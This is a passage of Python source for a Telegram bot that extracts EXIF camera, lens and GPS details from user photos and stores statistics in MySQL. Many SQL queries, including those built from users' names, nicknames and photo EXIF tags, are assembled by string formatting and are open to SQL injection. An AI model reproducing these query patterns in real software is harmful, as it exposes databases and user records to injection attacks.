    if command == 'last active users':

        try:
            last_active_users = users.get_last_active_users(100)
        except DatabaseConnectionError:
            return error_answer

        bot_users = ''
        # Makes a human readable list of last active users
        for usr, index in zip(last_active_users,
                              range(len(last_active_users))):
            user = User(*usr)
            bot_users += f'{index + 1}. {user}\n'

        answer = ('Up to 100 last active users by the time when they sent '
                  'picture last time:\n')
        answer += bot_users
        log.info('Done.')
        return answer

    elif command == 'total number photos sent':
        log.info('Evaluating total number of photo queries in database...')
        query = ('SELECT COUNT(chat_id) '
                 'FROM photo_queries_table2')
        try:
            cursor = db.execute_query(query)
        except DatabaseConnectionError:
            return error_answer
        answer += '{} times users sent photos.'.format(cursor.fetchone()[0])
        query = ('SELECT COUNT(chat_id) '
                 'FROM photo_queries_table2 '
                 'WHERE chat_id !={}'.format(config.MY_TELEGRAM))
        try:
            cursor = db.execute_query(query)
        except DatabaseConnectionError:
            answer += (""\nCannot calculate number of photos that were send ""
                       ""excluding your photos. Check logs"")
            return answer

        answer += '\nExcept you: {} times.'.format(cursor.fetchone()[0])
        log.info('Done.')
        return answer

    elif command == 'photos today':
        # Show how many photos have been sent since 00:00:00 of today
        log.info('Evaluating number of photos which were sent today.')
        query = (""SELECT COUNT(chat_id) ""
                 ""FROM photo_queries_table2 ""
                 ""WHERE time > '{}'"".format(today))
        try:
            cursor = db.execute_query(query)
        except DatabaseConnectionError:
            return error_answer
        answer += f'{cursor.fetchone()[0]} times users sent photos today.'
        query = (""SELECT COUNT(chat_id) ""
                 ""FROM photo_queries_table2 ""
                 ""WHERE time > '{}' ""
                 ""AND chat_id !={}"".format(today, config.MY_TELEGRAM))
        try:
            cursor = db.execute_query(query)
        except DatabaseConnectionError:
            return error_answer

        answer += '\nExcept you: {} times.'.format(cursor.fetchone()[0])
        log.info('Done.')
        return answer

    elif command == 'number of users':
        # Show number of users who has used bot at leas""
        # once or more (first for the whole time, then today)
        log.info('Evaluating number of users that use bot '
                 'since the first day and today...')
        try:
            num_of_users = users.get_total_number()
        except DatabaseConnectionError:
            return error_answer

        answer += f'There are totally {num_of_users} users.'

        query = (""SELECT COUNT(DISTINCT chat_id) ""
                 ""FROM photo_queries_table2 ""
                 ""WHERE time > '{}'"".format(today))
        try:
            cursor = db.execute_query(query)
        except DatabaseConnectionError:
            answer += (""\nCannot calculate how many user have sent their ""
                       ""photos today"")
            return answer

        answer += f'\n{cursor.fetchone()[0]} users have sent photos today.'
        log.info('Done.')
        return answer

    elif command == 'number of gadgets':
        # To show you number smartphones + cameras in database
        log.info('Evaluating number of cameras and smartphones in database...')
        query = ('SELECT COUNT(DISTINCT camera_name) '
                 'FROM photo_queries_table2')
        try:
            cursor = db.execute_query(query)
        except DatabaseConnectionError:
            return error_answer
        answer += (f'There are totally {cursor.fetchone()[0]} '
                   f'cameras/smartphones.')
        query = (""SELECT COUNT(DISTINCT camera_name) ""
                 ""FROM photo_queries_table2 ""
                 ""WHERE time > '{}'"".format(today))
        try:
            cursor = db.execute_query(query)
        except DatabaseConnectionError:
            answer += (""Cannot calculate the number of gadgets that have been ""
                       ""used today so far"")
            return answer

        answer += (f'\n{cursor.fetchone()[0]} cameras/smartphones '
                   'were used today.')
        log.info('Done.')
        return answer

    elif command == 'uptime':
        fmt = 'Uptime: {} days, {} hours, {} minutes and {} seconds.'
        td = datetime.now() - bot.start_time
        # datetime.timedelta.seconds returns you total number of seconds
        # since given time, so you need to perform
        # a little bit of math to make whole hours, minutes and seconds from it
        # And there isn't any normal way to do it in Python unfortunately
        uptime = fmt.format(td.days, td.seconds // 3600, td.seconds % 3600 //
                            60, td.seconds % 60)
        log.info(uptime)
        return uptime


@bot.message_handler(commands=['start'])
def create_main_keyboard(message):
    user = users.find_one(message)
    current_user_lang = user.language
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True,
                                       resize_keyboard=True)
    markup.row('Русский/English')
    markup.row(messages[current_user_lang]['top_cams'])
    markup.row(messages[current_user_lang]['top_lens'])
    markup.row(messages[current_user_lang]['top_countries'])
    bot.send_message(user.chat_id, messages[current_user_lang]['menu_header'],
                     reply_markup=markup)


# Decorator to handle text messages
@bot.message_handler(content_types=['text'])
def handle_menu_response(message):
    # keyboard_hider = telebot.types.ReplyKeyboardRemove()
    current_user_lang = users.find_one(message).language
    user = users.find_one(message)

    if message.text == 'Русский/English':

        new_lang = users.find_one(message).switch_language()
        if current_user_lang != new_lang:
            bot.send_message(user.chat_id, messages[new_lang]
                             ['switch_lang_success'])
            create_main_keyboard(message)
        else:
            bot.send_message(user.chat_id, messages[new_lang]
                             ['switch_lang_failure'])
            create_main_keyboard(message)

    elif message.text == messages[current_user_lang]['top_cams']:
        log.info('User %s asked for top cams', user)
        bot.send_message(user.chat_id,
                         text=get_most_popular_items('camera_name', message))
        log.info('List of most popular cameras '
                 'has been returned to %s', user)

        # in order not to check whether user has changed his nickname or
        # whatever every time his sends any request the bot will just check
        # it every time a user wants to get a statistic about the most
        # popular cameras
        users.compare_and_update(user, message)

    elif message.text == messages[current_user_lang]['top_lens']:
        log.info('User %s asked for top lens', user)
        bot.send_message(user.chat_id,
                         text=get_most_popular_items('lens_name',
                                                     message))
        log.info('List of most popular lens has been returned to %s', user)

    elif message.text == messages[current_user_lang]['top_countries']:
        log.info('User %s asked for top countries', user)
        lang_table_name = ('country_ru'
                           if current_user_lang == 'ru-RU'
                           else 'country_en')
        bot.send_message(user.chat_id,
                         text=get_most_popular_items(lang_table_name, message))
        log.info('List of most popular countries has '
                 'been returned to %s', user)

    elif (message.text.lower() == 'admin' and
          user.chat_id == int(config.MY_TELEGRAM)):
        # Creates inline keyboard with options for admin Function that handle
        # user interaction with the keyboard called admin_menu

        keyboard = types.InlineKeyboardMarkup()  # Make keyboard object
        button = types.InlineKeyboardButton  # just an alias to save space

        keyboard.add(button(text='Turn bot off', callback_data='off'))
        keyboard.add(button(text='Last active users',
                            callback_data='last active'))
        keyboard.add(button(text='Total number of photos were sent',
                            callback_data='total number photos sent'))
        keyboard.add(button(text='Number of photos today',
                            callback_data='photos today'))
        keyboard.add(button(text='Number of users',
                            callback_data='number of users'))
        keyboard.add(button(text='Number of gadgets',
                            callback_data='number of gadgets'))
        keyboard.add(button(text='Uptime', callback_data='uptime'))
        bot.send_message(config.MY_TELEGRAM,
                         'Admin commands', reply_markup=keyboard)

    else:
        log.info('%s sent text message.', user)

        # Answer to user that bot can't make a conversation with him
        bot.send_message(user.chat_id,
                         messages[current_user_lang]['dont_speak'])


@bot.callback_query_handler(func=lambda call: True)
def admin_menu(call):  # Respond commands from admin menu
    # Remove progress bar from pressed button
    bot.answer_callback_query(callback_query_id=call.id, show_alert=False)

    if call.data == 'off':
        if db.disconnect():
            bot.turn_off()
        else:
            log.error('Cannot stop bot.')
            bot.send_message(chat_id=config.MY_TELEGRAM,
                             text='Cannot stop bot.')
    elif call.data == 'last active':
        bot.send_message(config.MY_TELEGRAM,
                         text=get_admin_stat('last active users'))
    elif call.data == 'total number photos sent':
        bot.send_message(config.MY_TELEGRAM,
                         text=get_admin_stat('total number photos sent'))
    elif call.data == 'photos today':
        bot.send_message(config.MY_TELEGRAM,
                         text=get_admin_stat('photos today'))
    elif call.data == 'number of users':
        bot.send_message(config.MY_TELEGRAM,
                         text=get_admin_stat('number of users'))
    elif call.data == 'number of gadgets':
        bot.send_message(config.MY_TELEGRAM,
                         text=get_admin_stat('number of gadgets'))
    elif call.data == 'uptime':
        bot.send_message(config.MY_TELEGRAM,
                         text=get_admin_stat('uptime'))


@bot.message_handler(content_types=['photo'])
def answer_photo_message(message):
    user = users.find_one(message)
    bot.send_message(user.chat_id, messages[user.language]['as_file'])
    log.info('%s sent photo as a photo.', user)


def cache_number_users_with_same_feature(func):
    # Closure to cache previous results of given
    # function so to not call database to much
    # It saves result in a dictionary because result depends on a user.
    # cache_time - time in minutes when will
    # be returned cached result instead of calling database

    when_was_called = None
    result = {}

    def func_launcher(feature, feature_type):
        nonlocal result
        nonlocal when_was_called
        cache_time = 5

        # It's high time to reevaluate result instead
        # of just looking up in cache if countdown went off, if
        # function has not been called yet, if result for
        # feature (like camera, lens or country) not in cache
        high_time = (when_was_called + timedelta(minutes=cache_time) <
                     datetime.now() if when_was_called else True)

        if not when_was_called or high_time or feature not in result:
            when_was_called = datetime.now()
            num_of_users = func(feature, feature_type)
            result[feature] = num_of_users
            return num_of_users
        else:
            log.info('Returning cached result of %s',  func.__name__)
            time_left = (when_was_called + timedelta(minutes=cache_time) -
                         datetime.now())
            log.debug('Time to to reevaluate result of %s is %s',
                      func.__name__, str(time_left)[:-7])
            return result[feature]

    return func_launcher


def cache_most_popular_items(func):
    """"""
    Function that prevent calling any given function more often that once in
    a cache_time. It calls given function, then during next cache
    return func_launcher_time it
    will return cached result of a given function. Function call given
    function when: it hasn't been called before; cache_time is passed,
    user ask result in another language.

    :param func: some expensive function that we don't want to call too often
    because it can slow down the script
    :return: wrapper that figure out when to call function and when to
    return cached result
    """"""
    # store time when given function was called last time
    when_was_called = None
    # dictionary to store result where language of user
    # is key and message for user is a value
    result = {}

    def function_launcher(item_type, message):
        nonlocal func
        nonlocal result
        nonlocal when_was_called
        cache_time = 5

        # Only top countries can be returned in different languages.
        # For the other types of queries it doesn't mean a thing.
        if item_type == 'country_ru' or item_type == 'country_en':
            result_id = users.find_one(message).language + item_type
        else:
            result_id = item_type

        # evaluate boolean whether it is high time to call given function or
        # not
        high_time = (when_was_called + timedelta(minutes=cache_time) <
                     datetime.now() if when_was_called else True)

        if not result.get(result_id, None) or not when_was_called or high_time:
            when_was_called = datetime.now()
            result[result_id] = func(item_type, message)
            return result[result_id]
        else:
            log.debug('Return cached result of %s...', func.__name__)
            time_left = (when_was_called + timedelta(minutes=cache_time) -
                         datetime.now())
            log.debug('Time to reevaluate result of %s is %s',
                      func.__name__, str(time_left)[:-7])
            return result[result_id]

    return function_launcher


@cache_most_popular_items
def get_most_popular_items(item_type, message):
    """"""
    Get most common cameras/lenses/countries from database and
    make list of them
    :param item_type: string with column name to choose between cameras,
    lenses and countries
    :param message: telebot object with info about user and his message
    :return: string which is either list of most common
    cameras/lenses/countries or message which states that list is
    empty
    """"""

    user = users.find_one(message)

    def list_to_ordered_str_list(list_of_gadgets):
        # Make Python list to be string like roster with indexes and
        # new line characters like:
        # 1. Canon 80D
        # 2. iPhone 4S

        string_roaster = ''
        index = 1
        for item in list_of_gadgets:
            if not item[0]:
                continue
            string_roaster += '{}. {}\n'.format(index, item[0])
            index += 1
        return string_roaster

    log.debug('Evaluating most popular things...')

    # This query returns item types in order where the first one item
    # has the highest number of occurrences
    # in a given column
    query = ('SELECT {0} FROM photo_queries_table2 '
             'GROUP BY {0} '
             'ORDER BY count({0}) '
             'DESC'.format(item_type))
    try:
        cursor = db.execute_query(query)
    except DatabaseConnectionError:
        log.error(""Can't evaluate a list of the most popular items"")
        return messages[user.language]['doesnt work']

    # Almost impossible case but still
    if not cursor.rowcount:
        log.warning('There is nothing in the main database table')
        bot.send_message(chat_id=config.MY_TELEGRAM,
                         text='There is nothing in the main database table')
        return messages[user.language]['no_top']

    popular_items = cursor.fetchall()
    log.info('Finish evaluating the most popular items')
    return list_to_ordered_str_list(popular_items[:30])


@cache_number_users_with_same_feature
def get_number_users_by_feature(feature, feature_type):
    """"""
    Get number of users that have same smartphone, camera, lens or that
    have been to the same country
    :param feature: string which is name of a particular feature e.g.
    camera name or country name
    :param feature_type: string which is name of the column in database
    :param message: telebot object with info about message and its sender
    :return: string which is message to user
    """"""
    log.debug('Check how many users also have this feature: %s...',
              feature)

    query = (""SELECT DISTINCT chat_id ""
             ""FROM photo_queries_table2 ""
             ""WHERE {}='{}'"".format(feature_type, feature))
    try:
        cursor = db.execute_query(query)
    except DatabaseConnectionError:
        log.error(""Cannot check how many users also have this feature: %s..."",
                  feature)
        return None

    if not cursor.rowcount:
        log.debug('There were no users with %s...', feature)
        return None

    log.debug('There is %d users with %s', cursor.rowcount, feature)
    return cursor.rowcount - 1


@bot.message_handler(content_types=['document'])  # receive file
def handle_message_with_image(message):

    user = users.find_one(message)
    # Sending a message to a user that his photo is being processed
    bot.reply_to(message, messages[user.language]['photo_prcs'])
    log.info('%s sent photo as a file.', user)

    photo_message = PhotoMessage(message, user)
    answer = photo_message.prepare_answer()

    # if longitude is in the answer
    if answer[0][0]:
        lon = answer[0][0]
        lat = answer[0][1]
        bot.send_location(user.chat_id, lon, lat, live_period=None)
        bot.reply_to(message, answer[1], parse_mode='Markdown')
    else:
        bot.reply_to(message, answer, parse_mode='Markdown')


def main():
    log_files.clean_log_folder(1)
    users.cache(100)
    db.connect()
    bot.start_bot()


if __name__ == '__main__':
    main()
/n/n/n/photogpsbot/db_connector.py/n/n""""""
Module that provides a way to connect to MySQL and reconnect each time
connection is lost. It also can automatically set up SSH tunnel thanks to
sshtunnel module

Original way to do it was described at
https://help.pythonanywhere.com/pages/ManagingDatabaseConnections/
""""""

import socket

# goes as mysqlclient in requirements
import MySQLdb
import sshtunnel

from photogpsbot import log
import config


class DatabaseError(Exception):
    pass


class DatabaseConnectionError(Exception):
    pass


class Database:
    """"""
    Class that provides method to execute queries and handles connection to
    the MySQL database directly and via ssh if necessary
    """"""
    conn = None
    tunnel = None
    tunnel_opened = False

    def _open_ssh_tunnel(self):
        """"""
        Method that opens ssh tunnel to the server where the database of
        photogpsbot is located
        :return: None
        """"""
        log.debug('Establishing SSH tunnel to the server where the database '
                  'is located...')
        sshtunnel.SSH_TIMEOUT = 5.0
        sshtunnel.TUNNEL_TIMEOUT = 5.0
        self.tunnel = sshtunnel.SSHTunnelForwarder(
            ssh_address_or_host=config.SERVER_ADDRESS,
            ssh_username=config.SSH_USER,
            ssh_password=config.SSH_PASSWD,
            ssh_port=22,
            remote_bind_address=('127.0.0.1', 3306))

        self.tunnel.start()
        self.tunnel_opened = True
        log.debug('SSH tunnel has been established.')

    def connect(self):
        """"""
        Established connection either to local database or to remote one if
        the script runs not on the same server where database is located
        :return: None
        """"""
        if socket.gethostname() == config.PROD_HOST_NAME:
            log.info('Connecting to the local database...')
            port = 3306
        else:
            log.info('Connecting to the database via SSH...')
            if not self.tunnel_opened:
                self._open_ssh_tunnel()

            port = self.tunnel.local_bind_port

        self.conn = MySQLdb.connect(host='127.0.0.1',
                                    user=config.DB_USER,
                                    password=config.DB_PASSWD,
                                    port=port,
                                    database=config.DB_NAME,
                                    charset='utf8')
        log.info('Connected to the database.')

    def execute_query(self, query, parameters=None, trials=0):
        """"""
        Executes a given query
        :param query: query to execute
        :param trials: integer that denotes number of trials to execute
        a query in case of known errors
        :return: cursor object
        """"""
        if not self.conn or not self.conn.open:
            self.connect()

        try:
            cursor = self.conn.cursor()
            cursor.execute(query, parameters)

        # try to reconnect if MySQL server has gone away
        except MySQLdb.OperationalError as e:

            # (2013, Lost connection to MySQL server during query)
            # (2006, Server has gone away)
            if e.args[0] in [2006, 2013]:
                log.info(e)
                # log.debug(""Connecting to the MySQL again..."")

                self.connect()
                if trials > 3:
                    log.error(e)
                    log.warning(""Ran out of limit of trials..."")
                    raise DatabaseConnectionError(""Cannot connect to the ""
                                                  ""database"")

                trials += 1
                # trying to execute query one more time
                log.warning(e)
                log.info(""Trying execute the query again..."")
                return self.execute_query(query, parameters, trials)
            else:
                log.error(e)
                raise
        except Exception as e:
            log.error(e)
            raise
        else:
            return cursor

    def add(self, query):
        """"""
        Shortcut to add something to a database
        :param query: query to execute
        :return: boolean - True if the method succeeded and False otherwise
        """"""

        try:
            self.execute_query(query)
            self.conn.commit()
        except Exception as e:
            log.errror(e)
            raise DatabaseError(""Cannot add your data to the database!"")

    def disconnect(self):
        """"""
        Closes the connection to the database and ssh tunnel if needed
        :return: True if succeeded
        """"""
        if self.conn:
            self.conn.close()
            log.info('Connection to the database has been closed.')
        if self.tunnel:
            self.tunnel.stop()
            log.info('SSH tunnel has been closed.')
        self.tunnel_opened = False
        return True

    def __str__(self):
        return (f'Instance of a connector to the database. '
                f'The connection is {""opened"" if self.conn else ""closed""}. '
                f'SSH tunnel is {""opened"" if self.tunnel_opened else ""closed""}'
                '.')
/n/n/n/photogpsbot/process_image.py/n/nfrom dataclasses import dataclass
from typing import Dict

import exifread
from exifread.classes import IfdTag
from geopy.geocoders import Nominatim

from photogpsbot import bot, log, db, User


class InvalidCoordinates(Exception):
    """"""
    Coordinates have invalid format
    """"""


class NoCoordinates(Exception):
    """"""
    There is no location info
    """"""


class NoEXIF(Exception):
    """"""
    Means that there is no EXIF within the photo at all

    """"""


class NoData(Exception):
    """"""
    Means that there is actually no any data of our interest within the picture

    """"""


@dataclass
class ImageData:
    """"""
    A class to store info about a photo from user.
    """"""
    user: User
    date_time: str = None
    camera: str = None
    lens: str = None
    address: str = None
    country: Dict[str, str] = None
    latitude: float = None
    longitude: float = None


@dataclass
class RawImageData:
    """"""
    Raw data from photo that is still have to be converted in order to be used.
    """"""
    user: User
    date_time: str = None
    camera_brand: str = None
    camera_model: str = None
    lens_brand: str = None
    lens_model: str = None
    latitude_reference: str = None
    raw_latitude: IfdTag = None
    longitude_reference: str = None
    raw_longitude: IfdTag = None


class ImageHandler:

    def __init__(self, user, file):
        self.user = user
        self.file = file
        self.raw_data = None

    @staticmethod
    def _get_raw_data(file):
        """"""
        Get name of the camera and lens, the date when the photo was taken
        and raw coordinates (which later will be converted)
        :param file: byte sting with an image
        :return: RawImageData object with raw info from the photo
        """"""
        # Get data from the exif of the photo via external library
        exif = exifread.process_file(file, details=False)
        if not len(exif.keys()):
            reason = ""This picture doesn't contain EXIF.""
            log.info(reason)
            raise NoEXIF(reason)

        # Get info about camera ang lend from EXIF
        date_time = exif.get('EXIF DateTimeOriginal', None)
        date_time = str(date_time) if date_time else None
        camera_brand = str(exif.get('Image Make', ''))
        camera_model = str(exif.get('Image Model', ''))
        lens_brand = str(exif.get('EXIF LensMake', ''))
        lens_model = str(exif.get('EXIF LensModel', ''))

        if not any([date_time, camera_brand, camera_model, lens_brand,
                    lens_model]):
            # Means that there is actually no any data of our interest
            reason = 'There is no data of interest in this photo'
            log.info(reason)
            raise NoData(reason)

        try:  # Extract coordinates from EXIF
            latitude_reference = str(exif['GPS GPSLatitudeRef'])
            raw_latitude = exif['GPS GPSLatitude']
            longitude_reference = str(exif['GPS GPSLongitudeRef'])
            raw_longitude = exif['GPS GPSLongitude']

        except KeyError:
            log.info(""This picture doesn't contain coordinates."")
            # returning info about the photo without coordinates
            return (date_time, camera_brand, camera_model,
                    lens_brand, lens_model)
        else:
            # returning info about the photo with its coordinates
            return (date_time, camera_brand, camera_model,
                    lens_brand, lens_model, latitude_reference, raw_latitude,
                    longitude_reference, raw_longitude)

    @staticmethod
    def _dedupe_string(string):
        """"""
        Get rid of all repetitive words in a string
        :param string: string with camera or lens names
        :return: same string without repetitive words
        """"""

        deduped_string = ''

        for x in string.split(' '):
            if x not in deduped_string:
                deduped_string += x + ' '
        return deduped_string.rstrip()

    @staticmethod
    def _check_camera_tags(tags):
        """"""
        Function that convert stupid code name of a smartphone or camera
        from EXIF to meaningful one by looking a collation in a special MySQL
        table For example instead of just Nikon there can be
        NIKON CORPORATION in EXIF

        :param tags: name of a camera and lens from EXIF
        :return: list with one or two strings which are name of
        camera and/or lens. If there is not better name for the gadget
        in database, function just returns name how it is
        """"""
        checked_tags = []

        for tag in tags:
            if tag:  # If there was this information inside EXIF of the photo
                tag = str(tag).strip()
                log.info('Looking up collation for %s', tag)
                query = ('SELECT right_tag '
                         'FROM tag_table '
                         'WHERE wrong_tag=""{}""'.format(tag))
                cursor = db.execute_query(query)
                if not cursor:
                    log.error(""Can't check the tag because of the db error"")
                    log.warning(""Tag will stay as is."")
                    continue
                if cursor.rowcount:
                    # Get appropriate tag from the table
                    tag = cursor.fetchone()[0]
                    log.info('Tag after looking up in tag_tables - %s.', tag)

            checked_tags.append(tag)
        return checked_tags

    @staticmethod
    def _get_dd_coordinate(angular_distance, reference):
        """"""
         Convert coordinates from format in which they are typically written
         in EXIF to decimal degrees - format that Telegram or Google Map
         understand. Google coordinates, EXIF and decimals degrees if you
         need to understand what is going on here

         :param angular_distance: ifdTag object from the exifread module -
         it contains a raw coordinate - either longitude or latitude
         :param reference:
          :return: a coordinate in decimal degrees format
         """"""
        ag = angular_distance
        degrees = ag.values[0].num / ag.values[0].den
        minutes = (ag.values[1].num / ag.values[1].den) / 60
        seconds = (ag.values[2].num / ag.values[2].den) / 3600

        if reference in 'WS':
            return -(degrees + minutes + seconds)

        return degrees + minutes + seconds

    def _convert_coordinates(self, raw_data):
        """"""
        # Convert GPS coordinates from format in which they are stored in
        EXIF of photo to format that accepts Telegram (and Google Maps for
        example)

        :param data: EXIF data extracted from photo
        :param chat_id: user id
        :return: either floats that represents longitude and latitude or
        string with error message dedicated to user
        """"""

        # Return positive or negative longitude/latitude from exifread's ifdtag

        try:
            latitude = self._get_dd_coordinate(raw_data.raw_latitude,
                                               raw_data.latitude_reference)
            longitude = self._get_dd_coordinate(raw_data.raw_longitude,
                                                raw_data.longitude_reference)

        except Exception as e:
            # todo also find out the error in case there is no coordinates in
            #  raw_data
            log.error(e)
            log.error('Cannot read coordinates of this photo.')
            raw_coordinates = (f'Latitude reference: '
                               f'{raw_data.latitude_reference}\n'
                               f'Raw latitude: {raw_data.raw_latitude}.\n'
                               f'Longitude reference: '
                               f'{raw_data.longitude_reference} '
                               f'Raw longitude: {raw_data.raw_longitude}.\n')
            log.info(raw_coordinates)
            raise InvalidCoordinates

        else:
            return latitude, longitude

    @staticmethod
    def _get_address(latitude, longitude):

        """"""
         # Get address as a string by coordinates from photo that user sent
         to bot
        :param latitude:
        :param longitude:
        :return: address as a string where photo was taken; name of
        country in English and Russian to keep statistics
        of the most popular countries among users of the bot
        """"""

        address = {}
        country = {}
        coordinates = f""{latitude}, {longitude}""
        log.debug('Getting address from coordinates %s...', coordinates)
        geolocator = Nominatim()

        try:
            # Get name of the country in English and Russian language
            location = geolocator.reverse(coordinates, language='en')
            address['en-US'] = location.address
            country['en-US'] = location.raw['address']['country']

            location2 = geolocator.reverse(coordinates, language='ru')
            address['ru-RU'] = location2.address
            country['ru-RU'] = location2.raw['address']['country']
            return address, country

        except Exception as e:
            log.error('Getting address has failed!')
            log.error(e)
            raise

    def _convert_data(self, raw_data):
        date_time = (str(raw_data.date_time) if raw_data.date_time else None)

        # Merge a brand and model together
        camera = f'{raw_data.camera_brand} {raw_data.camera_model}'
        lens = f'{raw_data.lens_brand} {raw_data.lens_model}'

        # Get rid of repetitive words
        camera = (self._dedupe_string(camera) if camera != ' ' else None)
        lens = (self._dedupe_string(lens) if lens != ' ' else None)

        camera, lens = self._check_camera_tags([camera, lens])

        try:
            latitude, longitude = self._convert_coordinates(raw_data)
        except (InvalidCoordinates, NoCoordinates):
            address = country = latitude = longitude = None
        else:
            try:
                address, country = self._get_address(latitude, longitude)
            except Exception as e:
                log.warning(e)
                address = country = None

        return date_time, camera, lens, address, country, latitude, longitude

    def get_image_info(self):
        """"""
        Read data from photo and prepare answer for user
        with location and etc.
        """"""
        raw_data = RawImageData(self.user, *self._get_raw_data(self.file))
        image_data = ImageData(self.user, *self._convert_data(raw_data))

        return image_data
/n/n/n/photogpsbot/users.py/n/n""""""
Module to manage users of bot: store and update information, interact with
the database, keep tack of and switch language of interface for user
""""""

import config
from photogpsbot import bot, log, db
from photogpsbot.db_connector import DatabaseError, DatabaseConnectionError

from telebot.types import Message

class User:
    """"""
    Class that describes one user of this Telegram bot and helps to store basic
    info about him and his language of choice for interface of the bot
    """"""
    def __init__(self, chat_id, first_name, nickname, last_name,
                 language='en-US'):
        self.chat_id = chat_id
        self.first_name = first_name
        self.nickname = nickname
        self.last_name = last_name
        self.language = language

    def set_language(self, lang):
        """"""
        Update language of user in the User object and in the database
        :param lang: string with language tag like ""en-US""
        :return: None
        """"""
        log.debug('Updating info about user %s language '
                  'in memory & database...', self)

        self.language = lang

        query = (""UPDATE users ""
                 f""SET language='{self.language}' ""
                 f""WHERE chat_id='{self.chat_id}'"")

        try:
            db.add(query)
        except DatabaseError:
            log.error(""Can't add new language of %s to the database"", self)
        else:
            log.debug('Language updated.')

    def switch_language(self):
        """"""
        Switch language from Russian to English or conversely
        :return: string with language tag like ""en-US"" to be used for
        rendering menus and messages for user
        """"""
        curr_lang = self.language
        new_lang = 'ru-RU' if self.language == 'en-US' else 'en-US'
        log.info('Changing user %s language from %s to %s...', self,
                 curr_lang, new_lang)

        self.set_language(new_lang)

        return new_lang

    def __str__(self):
        return (f'{self.first_name} {self.nickname} {self.last_name} '
                f'({self.chat_id}) preferred language: {self.language}')

    def __repr__(self):
        return (f'{self.__class__.__name__}(chat_id={self.chat_id}, '
                f'first_name=""{self.first_name}"", nickname=""{self.nickname}"", '
                f'last_name=""{self.last_name}"", language=""{self.language}"")')


class Users:
    """"""
    Class for managing users of the bot: find them, add to system,
    cache them from the database, check whether user changed his info etc
    """"""
    def __init__(self):
        self.users = {}

    @staticmethod
    def get_total_number():
        """"""
        Count the total number of users in the database
        :return: integer which is the total number of users
        """"""
        query = ""SELECT COUNT(*) FROM users""
        try:
            cursor = db.execute_query(query)
        except DatabaseConnectionError:
            log.error(""Can't count the total number of users!"")
            raise

        return cursor.fetchone()[0]

    @staticmethod
    def get_last_active_users(limit):
        """"""
        Get from the database a tuple of users who have been recently using
        the bot
        :param limit: integer that specifies how much users to get
        :return: tuple of tuples with users info
        """"""
        log.info('Evaluating last active users with date of '
                 'last time when they used bot...')

        # From photo_queries_table2 we take chat_id of the last
        # active users and from 'users' table we take info about these
        # users by chat_id which is a foreign key
        query = ('SELECT p.chat_id, u.first_name, u.nickname, u.last_name, '
                 'u.language '
                 'FROM photo_queries_table2 p '
                 'INNER JOIN users u '
                 'ON p.chat_id = u.chat_id '
                 'GROUP BY u.chat_id, u.first_name, u.nickname, u.last_name, '
                 'u.language '
                 'ORDER BY MAX(time)'
                 f'DESC LIMIT {limit}')

        try:
            cursor = db.execute_query(query)
        except DatabaseConnectionError:
            log.error(""Cannot get the last active users because of some ""
                      ""problems with the database"")
            raise

        last_active_users = cursor.fetchall()
        return last_active_users

    def cache(self, limit):
        """"""
        Caches last active users from database to a dictionary inside object of
        this class
        :param limit: limit of entries to be cached
        :return: None
        """"""

        log.debug(""Start caching last active users from the DB..."")

        try:
            last_active_users = self.get_last_active_users(limit)
        except DatabaseConnectionError:
            log.error(""Cannot cache users!"")
            return

        for items in last_active_users:
            # if chat_id of a user is not known to the program
            if items[0] not in self.users:
                # adding users from database to the ""cache""
                self.users[items[0]] = User(*items)
                log.debug(""Caching user: %s"", self.users[items[0]])
        log.info('Users have been cached.')

    def clean_cache(self, limit):
        """"""
        Method that remove several User objects from cache - the least 
        active users
        :param limit: number of the users that the method should remove
        from cache
        :return: None
        """"""

        log.info('Figuring out the least active users...')
        # Select users that the least active recently
        user_ids = tuple(self.users.keys())
        query = ('SELECT chat_id '
                 'FROM photo_queries_table2 '
                 f'WHERE chat_id in {user_ids} '
                 'GROUP BY chat_id '
                 'ORDER BY MAX(time) '
                 f'LIMIT {limit}')

        try:
            cursor = db.execute_query(query)
        except DatabaseConnectionError:
            log.error(""Can't figure out the least active users..."")
            return

        if not cursor.rowcount:
            log.warning(""There are no users in the db"")
            return

        # Make list out of tuple of tuples that is returned by MySQL
        least_active_users = [chat_id[0] for chat_id in cursor.fetchall()]
        log.info('Removing %d least active users from cache...', limit)
        num_deleted_entries = 0
        for entry in least_active_users:
            log.debug('Deleting %s...', entry)
            deleted_entry = self.users.pop(entry, None)
            if deleted_entry:
                num_deleted_entries += 1
        log.debug(""%d users were removed from cache."", num_deleted_entries)

    @staticmethod
    def _add_to_db(user):
        """"""
        Adds User object to the database
        :param user: User object with info about user
        :return: None
        """"""
        query = (""INSERT INTO users (chat_id, first_name, nickname, ""
                 ""last_name, language) ""
                 f""VALUES ({user.chat_id}, '{user.first_name}', ""
                 f""'{user.nickname}', '{user.last_name}', '{user.language}')"")
        try:
            db.add(query)
        except DatabaseError:
            log.error(""Cannot add user to the database"")
        else:
            log.info(f""User {user} was successfully added to the users db"")

    def add_new_one(self, chat_id, first_name, nickname, last_name, language,
                    add_to_db=True):
        """"""
        Function to add a new User in dictionary with users and to the database
        at one fell swoop
        :param chat_id: id of a Telegram user
        :param first_name: first name of a Telegram user
        :param nickname: nickname of a Telegram user
        :param last_name: last name of a Telegram user
        :param language: preferred language of a Telegram user
        :param add_to_db: whether of not to add user to the database (for
        example, if bot is caching users from the database, there is clearly
        no point to add them back to the database)
        :return: User object with info about the added user
        """"""
        user = User(chat_id, first_name, nickname, last_name, language)
        self.users[chat_id] = user
        if add_to_db:
            self._add_to_db(user)
        return user

    @staticmethod
    def compare_and_update(user, message):
        """"""
        This method compare a user object from the bot and his info from
        the Telegram message to check whether a user has changed his bio
        or not. If yes, the user object that represents him in the bot will
        be updated accordingly. Now this function is called only when a user
        asks the bot for showing the most popular cams

        :param user: user object that represents a Telegram user in this bot
        :param message: object from Telegram that contains info about user's
        message and about himself
        :return: None
        """"""

        log.info('Checking whether user have changed his info or not...')
        msg = message.from_user
        usr_from_message = User(message.chat.id, msg.first_name, msg.username,
                                msg.last_name)

        if user.chat_id != usr_from_message.chat_id:
            log.error(""Wrong user to compare!"")
            return

        if user.first_name != usr_from_message.first_name:
            user.first_name = usr_from_message.first_name

        elif user.nickname != usr_from_message.nickname:
            user.nickname = usr_from_message.nickname

        elif user.last_name != usr_from_message.last_name:
            user.last_name = usr_from_message.last_name

        else:
            log.debug(""User's info hasn't changed"")
            return

        log.info(""User has changed his info"")
        log.debug(""Updating user's info in the database..."")
        query = (f""UPDATE users ""
                 f""SET first_name='{user.first_name}', ""
                 f""nickname='{user.nickname}', ""
